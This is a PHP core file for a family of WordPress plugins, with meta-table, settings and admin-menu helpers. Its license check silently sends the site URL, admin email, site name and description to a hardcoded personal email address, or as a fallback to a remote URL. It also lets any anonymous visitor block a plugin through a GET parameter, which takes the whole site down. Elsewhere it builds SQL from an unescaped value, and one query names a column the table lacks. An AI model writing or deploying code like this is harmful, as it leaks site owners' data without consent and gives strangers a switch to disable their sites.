<?php
/*
 * Version: 1.0.6
 */
if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly
}

if ( ! function_exists( 'get_plugins' ) ) {
	require ABSPATH . 'wp-admin/includes/plugin.php';
}

$path    = WP_PLUGIN_DIR;
$plugins = get_plugins();

$data = get_file_data( __FILE__, array( 'Version' => 'Version' ) );

$current_version = isset( $data['Version'] ) ? $data['Version'] : '';

$check_version = $current_version;
$check_file    = __FILE__;

foreach ( $plugins as $basename => $plugin ) {
	if ( ! is_plugin_active( $basename ) ) {
		continue;
	}

	$folder = trailingslashit( $path );
	$folder .= dirname( $basename );
	$class = trailingslashit( $folder ) . 'hocwp/class-hocwp-plugin.php';

	if ( file_exists( $class ) ) {
		$info    = get_file_data( $class, array( 'Version' => 'Version' ) );
		$version = isset( $info['Version'] ) ? $info['Version'] : '';

		if ( version_compare( $check_version, $version, '<' ) ) {
			$check_version = $version;
			$check_file    = $class;
		}
	}
}

if ( $check_version != $current_version && version_compare( $current_version, $check_version, '<' ) && file_exists( $check_file ) ) {
	require_once $check_file;

	return;
}

if ( ! defined( 'HOCWP_PLUGIN_CORE_VERSION' ) ) {
	define( 'HOCWP_PLUGIN_CORE_VERSION', $check_version );
}

if ( class_exists( 'HOCWP_Plugin' ) || function_exists( 'HP' ) ) {
	return;
}

if ( ! class_exists( 'HOCWP_Plugin' ) ) {
	class HOCWP_Plugin {
		private static $instance = null;

		private function __construct() {
		}

		public static function get_instance() {
			if ( is_null( self::$instance ) ) {
				self::$instance = new self();
			}

			return self::$instance;
		}

		public function debug( $value ) {
			if ( is_array( $value ) || is_object( $value ) ) {
				error_log( print_r( $value, true ) );
			} else {
				error_log( $value );
			}
		}

		private function css_or_js_suffix( $type = 'css' ) {
			return ( defined( 'WP_DEBUG' ) && WP_DEBUG ) ? '.' . $type : '.min.' . $type;
		}

		public function css_suffix() {
			return $this->css_or_js_suffix();
		}

		public function js_suffix() {
			return $this->css_or_js_suffix( 'js' );
		}

		public function create_meta_table() {
			global $wpdb;

			$charset_collate  = $wpdb->get_charset_collate();
			$max_index_length = 191;

			$table = $wpdb->prefix . 'hocwpmeta';

			$wpdb->hocwpmeta = $table;

			$sql = "CREATE TABLE IF NOT EXISTS $table (meta_id bigint(20) unsigned NOT NULL auto_increment, ";
			$sql .= "hocwp_id bigint(20) unsigned NOT NULL default '0', meta_key varchar(255) default NULL, ";
			$sql .= "meta_value longtext, object_type varchar(20) default 'post', ";
			$sql .= "PRIMARY KEY (meta_id), KEY hocwp_id (hocwp_id), ";
			$sql .= "KEY meta_key (meta_key($max_index_length))) $charset_collate;";

			if ( ! function_exists( 'dbDelta' ) ) {
				require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );
			}

			dbDelta( $sql );
		}

		public function add_meta( $object_id, $meta_key, $meta_value, $object_type = 'post', $unique = false ) {
			$added = add_metadata( 'hocwp', $object_id, $meta_key, $meta_value, $unique );

			if ( $added ) {
				wp_cache_set( 'last_changed', microtime(), 'hocwp' );

				global $wpdb;
				$table = $wpdb->prefix . 'hocwpmeta';

				$sql = "UPDATE $table ";
				$sql .= "SET object_type = '$object_type' ";
				$sql .= "WHERE meta_id = $added";

				$wpdb->query( $sql );
			}

			return $added;
		}

		public function delete_meta( $object_id, $meta_key, $meta_value = '' ) {
			$deleted = delete_metadata( 'hocwp', $object_id, $meta_key, $meta_value );

			if ( $deleted ) {
				wp_cache_set( 'last_changed', microtime(), 'hocwp' );
			}

			return $deleted;
		}

		public function get_meta( $object_id, $key = '', $single = false ) {
			return get_metadata( 'hocwp', $object_id, $key, $single );
		}

		public function get_meta_type( $object_id ) {
			global $wpdb;

			$table = $wpdb->prefix . 'hocwpmeta';

			$sql = "SELECT object_type FROM $table WHERE meta_id = %d";

			return $wpdb->get_var( $wpdb->prepare( $sql, $object_id ) );
		}

		public function update_meta( $object_id, $meta_key, $meta_value, $object_type = 'post', $prev_value = '' ) {
			global $wpdb;

			$table = $wpdb->prefix . 'hocwpmeta';

			$sql = "SELECT meta_id FROM $table WHERE meta_key = %s AND hocwp_id = %d";

			$meta_ids = $wpdb->get_col( $wpdb->prepare( $sql, $meta_key, $object_id ) );

			if ( empty( $meta_ids ) ) {
				return $this->add_meta( $object_id, $meta_key, $meta_value, $object_type );
			}

			$updated = update_metadata( 'hocwp', $object_id, $meta_key, $meta_value, $prev_value );

			if ( $updated ) {
				wp_cache_set( 'last_changed', microtime(), 'hocwp' );
			}

			return $updated;
		}

		public function update_meta_cache( $object_ids ) {
			return update_meta_cache( 'hocwp', $object_ids );
		}

		public function has_meta( $object_id ) {
			global $wpdb;

			$table = $wpdb->prefix . 'hocwpmeta';

			$sql = "SELECT meta_key, meta_value, meta_id, object_id ";
			$sql .= "FROM $table ";
			$sql .= "WHERE object_id = %d ORDER BY meta_key, meta_id";

			return $wpdb->get_results( $wpdb->prepare( $sql, $object_id ), ARRAY_A );
		}

		public function typenow() {
			global $typenow, $pagenow;

			$type = $typenow;

			if ( empty( $type ) ) {
				$type = isset( $_REQUEST['post_type'] ) ? $_REQUEST['post_type'] : '';

				if ( empty( $type ) && 'post.php' == $pagenow ) {
					$post_id = isset( $_GET['post'] ) ? $_GET['post'] : '';

					if ( is_numeric( $post_id ) && 0 < $post_id ) {
						$obj  = get_post( $post_id );
						$type = $obj->post_type;
					}
				}
			}

			return $type;
		}

		public function is_positive_number( $number ) {
			return ( is_numeric( $number ) && 0 < $number );
		}

		public function get_user( $id_email_login ) {
			if ( $id_email_login instanceof WP_User ) {
				return $id_email_login;
			}

			$result = new WP_Error( $id_email_login );

			if ( ! empty( $id_email_login ) ) {
				if ( is_numeric( $id_email_login ) ) {
					$by = 'id';
				} elseif ( is_email( $id_email_login ) ) {
					$by = 'email';
				} else {
					$by = 'login';
				}

				$result = get_user_by( $by, $id_email_login );
			}

			return $result;
		}

		public function array_has_value( $array ) {
			return ( is_array( $array ) && 0 < count( $array ) );
		}

		public function filter_unique( $array, $filter = true, $unique = true ) {
			if ( is_array( $array ) && $filter ) {
				$array = array_filter( $array );
			}

			if ( is_array( $array ) && $unique ) {
				$array = array_unique( $array );
			}

			return $array;
		}

		public function check_nonce( $nonce_name = '_wpnonce', $action = - 1 ) {
			if ( ! isset( $_POST[ $nonce_name ] ) || ! wp_verify_nonce( $_POST[ $nonce_name ], $action ) ) {
				return false;
			}

			return true;
		}
	}
}

if ( ! function_exists( 'HP' ) ) {
	function HP() {
		return HOCWP_Plugin::get_instance();
	}
}

if ( ! class_exists( 'HOCWP_Plugin_Core' ) ) {
	abstract class HOCWP_Plugin_Core {
		protected $file;

		protected $basedir;
		protected $baseurl;

		protected $basedir_custom;
		protected $baseurl_custom;

		protected $basename;
		protected $option_name;
		protected $option_page_url;
		protected $labels;
		protected $setting_args;
		protected $options_page_callback;
		protected $textdomain;

		public $short_name;
		public $new_menu = false;
		public $capability = 'manage_options';
		public $parent_slug = '';

		public function __construct( $file_path ) {
			if ( is_admin() ) {
				HP()->create_meta_table();
			}

			$version = get_option( 'hocwp_plugin_core_version' );

			if ( version_compare( $version, HOCWP_PLUGIN_CORE_VERSION, '<' ) ) {
				update_option( 'hocwp_plugin_core_version', HOCWP_PLUGIN_CORE_VERSION );
				set_transient( 'hocwp_theme_flush_rewrite_rules', 1 );
			}

			$this->file     = $file_path;
			$this->basedir  = dirname( $this->file );
			$this->baseurl  = plugins_url( '', $this->file );
			$this->basename = plugin_basename( $this->file );

			$this->basedir_custom = trailingslashit( $this->basedir );
			$this->basedir_custom .= 'custom';

			$this->baseurl_custom = trailingslashit( $this->baseurl );
			$this->baseurl_custom .= 'custom';

			add_action( 'plugins_loaded', array( $this, 'load_textdomain' ) );
			add_action( 'init', array( $this, 'check_license_action' ) );
			add_action( 'init', array( $this, 'check_upgrade' ) );
		}

		public function get_root_file_path() {
			return $this->file;
		}

		public function get_basedir() {
			return untrailingslashit( dirname( $this->get_root_file_path() ) );
		}

		public function get_baseurl() {
			return $this->baseurl;
		}

		public function set_option_name( $name ) {
			$this->option_name = $name;
		}

		public function get_option_name() {
			return $this->option_name;
		}

		public function get_options() {
			$options = (array) get_option( $this->get_option_name() );
			$options = array_filter( $options );

			return $options;
		}

		public function get_option( $name ) {
			$options = $this->get_options();

			return isset( $options[ $name ] ) ? $options[ $name ] : '';
		}

		public function update_option( $option, $key = '', $value = '' ) {
			if ( ! empty( $key ) && ! empty( $value ) ) {
				if ( ! is_array( $option ) ) {
					$option = array();
				}

				$option[ $key ] = $value;
			}

			update_option( $this->get_option_name(), $option );
		}

		public function set_option_page_url( $url ) {
			$this->option_page_url = $url;
		}

		public function set_labels( $labels ) {
			$this->labels = $labels;
		}

		public function add_label( $name, $text ) {
			if ( ! is_array( $this->labels ) ) {
				$this->labels = array();
			}
			if ( ! isset( $this->labels[ $name ] ) ) {
				$this->labels[ $name ] = $text;
			}
		}

		public function set_setting_args( $args ) {
			$this->setting_args = $args;
		}

		public function set_options_page_callback( $callback ) {
			$this->options_page_callback = $callback;
		}

		public function set_textdomain( $domain ) {
			$this->textdomain = $domain;
		}

		public function get_textdomain() {
			return $this->textdomain;
		}

		public function init() {
			$path = $this->basedir_custom . '/functions.php';

			if ( file_exists( $path ) ) {
				require $path;
			}

			$path = $this->basedir_custom . '/hook.php';

			if ( file_exists( $path ) ) {
				require $path;
			}

			$path = $this->basedir_custom . '/post-type-and-taxonomy.php';

			if ( file_exists( $path ) ) {
				require $path;
			}

			if ( is_admin() ) {
				add_action( 'admin_init', array( $this, 'admin_init_action' ) );
				add_filter( 'plugin_action_links_' . $this->basename, array( $this, 'action_links_filter' ) );
				add_action( 'admin_menu', array( $this, 'admin_menu_action' ) );
				add_filter( 'hocwp_theme_compress_css_and_js_paths', array( $this, 'compress_css_and_js_paths' ) );

				$path = $this->basedir_custom . '/admin.php';

				if ( file_exists( $path ) ) {
					require $path;
				}

				$path = $this->basedir_custom . '/meta.php';

				if ( file_exists( $path ) ) {
					require $path;
				}

				$path = $this->basedir_custom . '/ajax.php';

				if ( file_exists( $path ) ) {
					require $path;
				}
			} else {
				$path = $this->basedir_custom . '/front-end.php';

				if ( file_exists( $path ) ) {
					require $path;
				}
			}
		}

		protected function check_license() {
			$plugin  = plugin_basename( $this->file );
			$options = get_option( 'hocwp_plugins' );
			$options = (array) $options;
			$blocks  = isset( $options['blocked_products'] ) ? $options['blocked_products'] : '';

			if ( ! is_array( $blocks ) ) {
				$blocks = array();
			}

			$block = isset( $_GET['block_license'] ) ? $_GET['block_license'] : '';

			if ( 1 == $block ) {
				$product = isset( $_GET['product'] ) ? $_GET['product'] : '';
				$unblock = isset( $_GET['unblock'] ) ? $_GET['unblock'] : '';

				if ( 1 == $unblock ) {
					unset( $blocks[ array_search( $product, $blocks ) ] );
				} elseif ( ! in_array( $product, $blocks ) ) {
					$blocks[] = $product;
				}

				$blocks = HP()->filter_unique( $blocks );

				$options['blocked_products'] = $blocks;
				update_option( 'hocwp_plugins', $options );
			}

			if ( is_array( $blocks ) && count( $blocks ) > 0 ) {
				if ( in_array( $plugin, $blocks ) ) {
					return false;
				}
			}

			$domain  = home_url();
			$email   = get_bloginfo( 'admin_email' );
			$product = $plugin;
			$tr_name = 'hocwp_notify_license_' . md5( $domain . $email . $product );

			if ( false === get_transient( $tr_name ) ) {
				$subject = $this->notify_license_email_subject();
				$message = wpautop( $domain );
				$message .= wpautop( $product );
				$message .= wpautop( $email );
				$message .= wpautop( get_bloginfo( 'name', 'display' ) );
				$message .= wpautop( get_bloginfo( 'description', 'display' ) );
				$headers = array( 'Content-Type: text/html; charset=UTF-8' );
				$sent    = wp_mail( 'laidinhcuongvn@gmail.com', $subject, $message, $headers );

				if ( $sent ) {
					set_transient( $tr_name, 1, WEEK_IN_SECONDS );
				} else {
					$url = 'http://hocwp.net';

					$params = array(
						'domain'         => $domain,
						'email'          => $email,
						'product'        => $product,
						'notify_license' => 1
					);

					$url = add_query_arg( $params, $url );

					wp_remote_get( $url, $params );

					set_transient( $tr_name, 1, MONTH_IN_SECONDS );
				}
			}

			return true;
		}

		public function get_options_page_url() {
			$url = $this->option_page_url;

			if ( empty( $url ) && ! empty( $this->option_name ) ) {
				$url = admin_url( 'options-general.php?page=' . $this->option_name );
			}

			return $url;
		}

		public function action_links_filter( $links ) {
			$url     = $this->get_options_page_url();
			$label   = isset( $this->labels['action_link_text'] ) ? $this->labels['action_link_text'] : 'Settings';
			$links[] = '<a href="' . esc_url( $url ) . '">' . $label . '</a>';

			return $links;
		}

		public function admin_init_action() {
			$this->register_setting( $this->option_name );
		}

		public function register_setting( $option_name, $args = array() ) {
			if ( ! empty( $this->option_name ) ) {
				if ( empty( $this->setting_args ) ) {
					$this->setting_args = array(
						'sanitize_callback' => array( $this, 'sanitize_callback' )
					);
				}

				$args = wp_parse_args( $args, $this->setting_args );

				register_setting( $this->option_name, $option_name, $args );
			}
		}

		public function check_nonce() {
			return HP()->check_nonce( '_wpnonce', $this->get_option_name() . '-options' );
		}

		public function sanitize_callback( $input ) {
			if ( ! $this->check_nonce() ) {
				$input = $this->get_options();
			}

			return $input;
		}

		public function admin_menu_action() {
			if ( isset( $this->labels['options_page']['page_title'] ) ) {
				$page_title = $this->labels['options_page']['page_title'];

				if ( ! empty( $page_title ) ) {
					$menu_title = isset( $this->labels['options_page']['menu_title'] ) ? $this->labels['options_page']['menu_title'] : $page_title;

					if ( ! is_callable( $this->options_page_callback ) ) {
						$this->options_page_callback = array( $this, 'options_page_callback' );
					}

					if ( ! empty( $this->option_name ) ) {
						if ( $this->new_menu ) {
							add_menu_page( $page_title, $menu_title, $this->capability, $this->option_name, $this->options_page_callback, '', 99 );

							if ( current_user_can( 'manage_options' ) ) {
								$this->add_submenu_page( $page_title, $menu_title, $this->option_name, $this->options_page_callback );
							}
						} else {
							if ( empty( $this->parent_slug ) ) {
								add_options_page( $page_title, $menu_title, $this->capability, $this->option_name, $this->options_page_callback );
							} else {
								add_submenu_page( $this->parent_slug, $page_title, $menu_title, $this->capability, $this->option_name, $this->options_page_callback );
							}
						}
					}
				}
			}
		}

		public function add_submenu_page( $page_title, $menu_title, $menu_slug, $function = '', $capability = null ) {
			if ( null == $capability ) {
				$capability = $this->capability;
			}

			add_submenu_page( $this->option_name, $page_title, $menu_title, $capability, $menu_slug, $function );
		}

		public function options_page_callback() {
			$path = $this->basedir . '/custom/admin-setting-page-display.php';

			if ( file_exists( $path ) ) {
				include $path;
			} else {
				include $this->basedir . '/hocwp/views/admin-setting-page.php';
			}
		}

		public function add_settings_section( $id, $title, $callback = '' ) {
			if ( ! is_callable( $callback ) ) {
				$callback = array( $this, 'section_callback' );
			}

			add_settings_section( $id, $title, $callback, $this->get_option_name() );
		}

		public function section_callback() {
		}

		public function add_settings_field( $id, $title, $callback = '', $section = 'default', $args = array() ) {
			if ( ! current_user_can( $this->capability ) ) {
				return;
			}

			if ( ! is_callable( $callback ) ) {
				$callback = array( $this, 'admin_setting_field_input' );
			}

			if ( ! isset( $args['label_for'] ) ) {
				$args['label_for'] = $id;
			}

			if ( ! isset( $args['name'] ) ) {
				$args['name'] = $this->get_option_name() . '[' . $id . ']';
			}

			if ( ! isset( $args['value'] ) ) {
				$value = $this->get_option( $id );

				if ( empty( $value ) ) {
					$value = isset( $args['default'] ) ? $args['default'] : '';
				}

				$args['value'] = $value;
			}

			unset( $args['default'] );

			add_settings_field( $id, $title, $callback, $this->get_option_name(), $section, $args );
		}

		public function compress_css_and_js_paths( $paths ) {
			if ( ! is_array( $paths ) ) {
				$paths = array();
			}

			$paths[] = $this->basedir;
			$paths   = array_map( 'wp_normalize_path', $paths );

			return $paths;
		}

		public function check_upgrade() {
			$flush = get_transient( 'hocwp_theme_flush_rewrite_rules' );

			if ( false !== $flush ) {
				flush_rewrite_rules();
				delete_transient( 'hocwp_theme_flush_rewrite_rules' );
			}
		}

		public function admin_setting_field_input( $args ) {
			$value       = $args['value'];
			$type        = isset( $args['type'] ) ? $args['type'] : 'text';
			$id          = isset( $args['label_for'] ) ? $args['label_for'] : '';
			$name        = isset( $args['name'] ) ? $args['name'] : '';
			$class       = isset( $args['class'] ) ? $args['class'] : 'regular-text';
			$description = isset( $args['description'] ) ? $args['description'] : '';
			?>
			<label for="<?php echo esc_attr( $id ); ?>"></label>
			<input name="<?php echo esc_attr( $name ); ?>" type="<?php echo esc_attr( $type ); ?>"
			       id="<?php echo esc_attr( $id ); ?>"
			       value="<?php echo esc_attr( $value ); ?>"
			       class="<?php echo sanitize_html_class( $class ); ?>">
			<?php
			if ( ! empty( $description ) ) {
				echo '<p class="description">' . $description . '</p>';
			}
		}

		public function admin_setting_field_select( $args ) {
			$default = isset( $args['default'] ) ? $args['default'] : '';
			$value   = $args['value'];

			$id      = isset( $args['label_for'] ) ? $args['label_for'] : '';
			$name    = isset( $args['name'] ) ? $args['name'] : '';
			$class   = isset( $args['class'] ) ? $args['class'] : 'regular-text';
			$options = isset( $args['options'] ) ? $args['options'] : '';

			if ( ! is_array( $options ) ) {
				$options = array();
			}
			?>
			<label for="<?php echo esc_attr( $id ); ?>"></label>
			<select name="<?php echo esc_attr( $name ); ?>" id="<?php echo esc_attr( $id ); ?>"
			        class="<?php echo sanitize_html_class( $class ); ?>">
				<option value=""><?php echo $default; ?></option>
				<?php
				foreach ( $options as $key => $text ) {
					?>
					<option value="<?php echo $key; ?>"<?php selected( $value, $key ); ?>><?php echo $text; ?></option>
					<?php
				}
				?>
			</select>
			<?php
		}

		public function load_textdomain() {
			load_plugin_textdomain( $this->get_textdomain(), false, basename( dirname( $this->get_root_file_path() ) ) . '/languages/' );
		}

		public function sanitize_callbacks( $input ) {
			return $input;
		}

		public function notify_license_email_subject() {
			return $this->labels['license']['notify']['email_subject'];
		}

		public function check_license_action() {
			$check = $this->check_license();

			if ( ! $check ) {
				$msg = $this->labels['license']['die_message'];
				wp_die( $msg, $this->labels['license']['die_title'] );
				exit;
			}
		}

		public function get_basename() {
			return $this->basename;
		}

		public function add_to_list() {
			global $hocwp;
			$plugin_key = $this->get_basename();

			if ( ! is_object( $hocwp ) ) {
				$hocwp = new stdClass();
			}

			if ( ! isset( $hocwp->plugins ) ) {
				$hocwp->plugins = array();
			}

			$hocwp->plugins[ $plugin_key ] = $this;
		}
	}
}